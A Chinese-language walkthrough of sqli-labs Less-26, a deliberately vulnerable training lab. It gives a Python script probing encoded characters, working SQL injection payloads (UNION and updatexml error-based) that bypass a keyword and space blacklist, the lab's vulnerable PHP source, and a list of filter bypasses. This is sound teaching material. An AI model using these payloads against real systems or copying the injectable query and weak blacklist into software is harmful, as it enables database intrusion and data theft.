# Less-26 **GET Trick with comments**
TAG：GET型注入、空格与注释符过滤  
## 漏洞利用  
根据less页面提示，此less过滤掉了空格和注释符    
![less26_1](images\less26_1.png)  
  
经过实际测试，过滤的还有负号 ```-``` ,这个负号其实是单行注释 ```--``` 的一部分,被当作注释符过滤了  
![less26_2](images\less26_2.png)  
  
经测试，```or```被过滤  
![less26_3](images\less26_3.png)  
  
经测试，```and```被过滤  
![less26_4](images\less26_4.png)  
  
经测试，```\```与```/```被过滤  
![less26_5](images\less26_5.png)  
  
此时考虑使用URI编码进行绕过，使用python脚本测试可以使用的编码  
```
import requests

def changeToHex(num):
    tmp = hex(i).replace("0x", "")
    if len(tmp)<2:
        tmp = '0' + tmp
    return "%" + tmp

req = requests.session()
for i in xrange(0,256):
    i = changeToHex(i) 
    url = "http://192.168.232.154/sqli-labs/Less-26/?id=1'" + i + "%26%26" + i + "'1'='1"
    ret = req.get(url)
    if 'Dumb' in ret.content:
        print "good,this can use:" + i
```
  
获取测试结果  
![less26_6](images\less26_6.png)  
  
可以使用uri编码进行过滤的绕过，但在window系统下的apache存在编码问题，需要将实验网站环境运行在linux系统下   
> URI编码手册：https://www.w3school.com.cn/tags/html_ref_urlencode.html   

Payload:```?id=0'%a0union%a0select%a02,database(),4%a0||%a0'1'='1```
![less26_7](images\less26_7.png)  
  
也可以使用报错注入完成此less  
Payload:```?id=0'||updatexml(1,concat('$',(database())),0)||'1'='1```
![less26_8](images\less26_8.png)  

## 源码分析  
### less26源码：  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-26 Trick with comments</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		print_r(mysql_error());
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-26.jpg" />
</br>
</br>
</br>
<img src="../images/Less-26-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
</font> 
</center>
</body>
</html>
```  
   
### 漏洞点分析   
```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```
此less的  ```blacklist()```  函数使用了preg_replace()函数对```or```,```and```,```/*```,```--```,```#```,```\s```(空格),```\/```敏感字符串进行了正则过滤  
针对这些过滤存在很多绕过方法  
> 用```||```代替```or```   
> 用```&&```代替```and```   
> 用```;%00```代替注释符
> 用```%a0```代替空格符  

